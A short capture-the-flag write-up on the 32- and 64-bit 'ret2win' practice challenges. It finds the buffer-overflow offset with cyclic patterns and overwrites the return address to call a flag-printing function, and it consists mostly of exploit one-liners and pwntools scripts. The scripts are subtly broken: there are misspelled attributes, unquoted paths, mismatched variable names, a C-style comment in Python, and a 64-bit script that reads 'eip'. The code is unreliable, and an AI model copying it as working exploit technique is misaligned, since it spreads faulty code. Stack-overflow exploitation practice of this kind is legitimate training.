
# Ret2Win 32 bit

This hallenge is a simple buffer overflow, with this command we can retrive the
distance between the start of the buffer and the return address:

```bash
pattern create 50 | ./ret2win32
sudo dmesg | tail -n1
pattern offset <address segfault>
```

In this case is 44.
Reading the code with objdump we will see that there is a function ret2win that
do a system call with '/bin/cat flag.txt', as parameter at index 0x08048659.
So we just need to rewrite the return address with the address of ret2win function.

```bash
python -c 'import struct; print("A"*44 + struct.pack("<I", 0x08048659))' | ./ret2win32
```

```python
import os
from pwn import *

r.process('./ret2win32')
r.recvuntil('>')
r.sendline(cyclic(55))
r.recvall()
core = Core('core')
eip = cyclic_find(core.eip)

bin = ELF(./ret2win32)
payload = "A" * eip
payload += p32(elf.symnols['ret2win'])

r.recvuntil('>')
r.sendline(payload)
```

# Ret2Win 64 bit

```python
import os
from pwn import *

r.process('./ret2win64')
r.recvuntil('>')
r.sendline(cyclic(50))
r.recvall()
core = Core('core')
eip = cyclic_find(core.eip) //40

bin = ELF(./ret2win64)
payload = "A" * eip
payload += p64(elf.symnols['ret2win'])

r.recvuntil('>')
r.sendline(payload)
```
